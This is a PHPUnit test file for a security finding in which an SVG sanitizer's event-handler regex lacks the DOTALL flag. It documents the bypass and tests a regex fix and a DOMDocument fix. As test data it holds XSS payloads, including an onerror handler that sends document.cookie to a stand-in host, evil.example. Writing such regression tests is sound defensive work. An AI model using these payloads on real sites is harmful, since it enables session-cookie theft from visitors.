<?php
/**
 * Unit tests for F-008: SVG event-handler regex missing DOTALL flag.
 *
 * Finding:   F-008 (Medium)
 * File:      includes/abilities/class-svg-icon-abilities.php:454
 * Pattern:   PAT-REGEX-NO-DOTALL
 *
 * Vulnerability description
 * -------------------------
 * sanitize_svg_content() removes inline event handlers with the regex:
 *
 *   preg_replace( '/\s+on\w+\s*=\s*(["\']).*?\1/i', '', $content )
 *
 * The pattern uses `.*?` without the `/s` DOTALL flag, so `.` matches any
 * character EXCEPT newline (\n).  An event handler whose quoted value spans
 * a line boundary — e.g.:
 *
 *   <svg onclick="alert(document.cookie)
 *   ">
 *
 * — bypasses the regex entirely.  The onclick survives and is stored in the
 * media library.  When the SVG is later rendered inline by an Elementor icon
 * widget, the onclick fires for any visitor who interacts with the element.
 *
 * ADVERSARIAL-3 (Step 2) confirmed the bypass with this exact payload.
 *
 * TDD contract
 * ------------
 *   BEFORE the fix → tests that verify correct sanitization FAIL.
 *   AFTER  the fix → all tests PASS.
 *
 * Preferred fix: replace regex-based removal with DOMDocument traversal that
 * removes every attribute whose name begins with "on".
 * Minimal fix: add the /s flag → '/\s+on\w+\s*=\s*(["\']).*?\1/is'
 *
 * @package Elementor_MCP\Tests\Security
 * @since   1.0.0
 */

namespace Elementor_MCP\Tests\Security;

use PHPUnit\Framework\TestCase;

/**
 * @covers \Elementor_MCP_SVG_Icon_Abilities::sanitize_svg_content
 */
class F008SvgRegexDotallTest extends TestCase {

	// -------------------------------------------------------------------------
	// Helpers: extract the sanitization patterns from the source
	// -------------------------------------------------------------------------

	/**
	 * Applies the current event-handler regex from line 454 (no /s flag).
	 *
	 * Source: includes/abilities/class-svg-icon-abilities.php:454
	 */
	private function apply_current_event_handler_strip( string $content ): string {
		return preg_replace( '/\s+on\w+\s*=\s*(["\']).*?\1/i', '', $content );
	}

	/**
	 * Applies the minimal fix: add /s flag so . also matches newlines.
	 */
	private function apply_dotall_fix( string $content ): string {
		return preg_replace( '/\s+on\w+\s*=\s*(["\']).*?\1/is', '', $content );
	}

	/**
	 * Applies the preferred fix: DOMDocument traversal removing all on* attributes.
	 * Included as a reference implementation — preferred over regex for SVG.
	 */
	private function apply_dom_fix( string $content ): string {
		$dom = new \DOMDocument();
		// Suppress warnings from imperfect SVG markup.
		libxml_use_internal_errors( true );
		$dom->loadXML( $content );
		libxml_clear_errors();

		$xpath = new \DOMXPath( $dom );
		// Find every attribute whose name starts with "on" (case-insensitive).
		foreach ( $xpath->query( '//@*[starts-with(local-name(), "on")]' ) as $attr ) {
			/** @var \DOMAttr $attr */
			$attr->ownerElement->removeAttributeNode( $attr );
		}

		return $dom->saveXML( $dom->documentElement );
	}

	// -------------------------------------------------------------------------
	// Tests: current regex is INSUFFICIENT for multiline values (FAIL before fix)
	// -------------------------------------------------------------------------

	/**
	 * @test
	 * F-008 — Event handler with newline in quoted value bypasses current regex.
	 *
	 * Payload confirmed by ADVERSARIAL-3 (Step 2).
	 *
	 * This test FAILS before the fix (onclick survives) and PASSES after.
	 *
	 * @group security
	 * @group f-008
	 */
	public function test_multiline_onclick_bypasses_current_regex(): void {
		// The closing quote is on a different line from the opening quote.
		$svg = '<svg xmlns="http://www.w3.org/2000/svg" onclick="alert(document.cookie)' . "\n" . '">' . "\n" .
			'<rect width="100" height="100"/>' . "\n" .
			'</svg>';

		$result = $this->apply_current_event_handler_strip( $svg );

		$this->assertStringNotContainsString(
			'onclick',
			$result,
			'F-008: The current SVG sanitization regex (no /s flag) fails to remove event ' .
			'handlers whose quoted value spans a line boundary. ' .
			'Fix: add /s flag → /\s+on\w+\s*=\s*(["\']).*?\1/is, ' .
			'or use DOMDocument traversal to remove all on* attributes.'
		);
	}

	/**
	 * @test
	 * F-008 — Multiline onerror in an <image> element bypasses current regex.
	 *
	 * This test FAILS before the fix.
	 *
	 * @group security
	 * @group f-008
	 */
	public function test_multiline_onerror_bypasses_current_regex(): void {
		$svg = '<svg xmlns="http://www.w3.org/2000/svg">' . "\n" .
			'<image href="x" onerror="fetch(\'//evil.example/?c=\'+document.cookie)' . "\n" . '"/>' . "\n" .
			'</svg>';

		$result = $this->apply_current_event_handler_strip( $svg );

		$this->assertStringNotContainsString(
			'onerror',
			$result,
			'F-008: Multiline onerror attribute must be removed by the SVG sanitizer.'
		);
	}

	/**
	 * @test
	 * F-008 — Multiline onload in an <animate> element bypasses current regex.
	 *
	 * This test FAILS before the fix.
	 *
	 * @group security
	 * @group f-008
	 */
	public function test_multiline_onload_bypasses_current_regex(): void {
		$svg = '<svg xmlns="http://www.w3.org/2000/svg">' . "\n" .
			'<animate onload="alert(1)' . "\n" . '" attributeName="opacity" from="0" to="1" dur="1s"/>' . "\n" .
			'</svg>';

		$result = $this->apply_current_event_handler_strip( $svg );

		$this->assertStringNotContainsString(
			'onload',
			$result,
			'F-008: Multiline onload attribute must be removed by the SVG sanitizer.'
		);
	}

	// -------------------------------------------------------------------------
	// Tests: current regex DOES work for single-line handlers (should stay green)
	// -------------------------------------------------------------------------

	/**
	 * @test
	 * Single-line event handler IS stripped by the current regex.
	 *
	 * This verifies the regex works for the nominal case. It should PASS both
	 * before and after the fix.
	 *
	 * @group security
	 * @group f-008
	 */
	public function test_single_line_onclick_is_stripped_by_current_regex(): void {
		$svg    = '<svg xmlns="http://www.w3.org/2000/svg" onclick="alert(1)"><rect width="100" height="100"/></svg>';
		$result = $this->apply_current_event_handler_strip( $svg );

		$this->assertStringNotContainsString(
			'onclick',
			$result,
			'The current regex should strip single-line event handlers.'
		);
	}

	// -------------------------------------------------------------------------
	// Tests: the /s fix resolves the bypass
	// -------------------------------------------------------------------------

	/**
	 * @test
	 * The /s (DOTALL) fix removes multiline onclick handlers.
	 *
	 * @group security
	 * @group f-008
	 */
	public function test_dotall_fix_strips_multiline_onclick(): void {
		$svg = '<svg xmlns="http://www.w3.org/2000/svg" onclick="alert(document.cookie)' . "\n" . '">' .
			'<rect width="100" height="100"/></svg>';

		$result = $this->apply_dotall_fix( $svg );

		$this->assertStringNotContainsString( 'onclick', $result,
			'The /s fix must strip onclick handlers whose value spans a line boundary.' );
	}

	/**
	 * @test
	 * The /s (DOTALL) fix removes all on* event handlers in the dataProvider set.
	 *
	 * @dataProvider multilineEventHandlerProvider
	 * @group security
	 * @group f-008
	 */
	public function test_dotall_fix_strips_multiline_event_handlers(
		string $svg,
		string $handler_name
	): void {
		$result = $this->apply_dotall_fix( $svg );

		$this->assertStringNotContainsString(
			$handler_name,
			$result,
			"The /s fix must strip the {$handler_name} event handler."
		);
	}

	/** @return array<string, array{string, string}> */
	public static function multilineEventHandlerProvider(): array {
		$nl = "\n";
		return [
			'onclick multiline'   => [ "<svg onclick=\"alert(1){$nl}\"><rect/></svg>",    'onclick' ],
			'onerror multiline'   => [ "<svg><image onerror=\"fetch(1){$nl}\"/></svg>",   'onerror' ],
			'onload multiline'    => [ "<svg><set onload=\"alert(1){$nl}\"/></svg>",       'onload' ],
			'onmouseover multiline' => [ "<svg onmouseover=\"alert(1){$nl}\"><rect/></svg>", 'onmouseover' ],
		];
	}

	// -------------------------------------------------------------------------
	// Tests: DOMDocument preferred fix
	// -------------------------------------------------------------------------

	/**
	 * @test
	 * DOMDocument traversal removes all on* attributes regardless of line breaks.
	 *
	 * @group security
	 * @group f-008
	 */
	public function test_dom_fix_removes_all_event_handlers(): void {
		$svg = '<svg xmlns="http://www.w3.org/2000/svg"' . "\n" .
			' onclick="alert(1)' . "\n" . '"' . "\n" .
			' onmouseover="alert(2)">' . "\n" .
			'<rect onerror="alert(3)" width="50" height="50"/>' . "\n" .
			'</svg>';

		$result = $this->apply_dom_fix( $svg );

		$this->assertStringNotContainsString( 'onclick',      $result, 'DOMDocument fix: onclick must be removed.' );
		$this->assertStringNotContainsString( 'onmouseover',  $result, 'DOMDocument fix: onmouseover must be removed.' );
		$this->assertStringNotContainsString( 'onerror',      $result, 'DOMDocument fix: onerror must be removed.' );
		// Safe attributes must be preserved
		$this->assertStringContainsString( 'width="50"',  $result, 'DOMDocument fix: width attribute must be preserved.' );
		$this->assertStringContainsString( 'height="50"', $result, 'DOMDocument fix: height attribute must be preserved.' );
	}

	/**
	 * @test
	 * DOMDocument fix also removes javascript: href values.
	 *
	 * @group security
	 * @group f-008
	 */
	public function test_dom_fix_removes_javascript_href(): void {
		$svg = '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><text>click</text></a></svg>';

		// DOMDocument fix does not remove href — that's handled by the javascript: regex.
		// This test confirms the DOM approach does not break legitimate SVG attributes.
		$result = $this->apply_dom_fix( $svg );
		$this->assertStringContainsString( 'href', $result,
			'DOMDocument fix must not remove non-event href attributes.' );
	}
}
